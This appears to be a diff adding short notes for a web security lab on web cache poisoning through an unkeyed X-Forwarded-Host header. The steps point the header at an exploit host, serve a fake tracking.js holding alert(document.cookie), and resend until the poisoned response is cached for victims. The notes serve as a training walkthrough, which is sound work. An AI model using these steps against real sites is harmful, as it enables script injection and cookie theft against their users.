@@ -1,1 +1,9 @@
-#1 Lab: 
+#1 Lab: Web cache poisoning with an unkeyed header
+
+    1. Send / to repeater
+    2. Add a new header "X-Forwarded-Host: exploit.id and send the request
+    3. In the exploit page change /exploit to /resources/js/tracking.js
+    4. Save alert(document.cookie) and send the request until cache gets hit
+    5. When cache gets hit you will see the alert with cookie in victim's browser
+
+---------------------------------------------------------------------------------------------
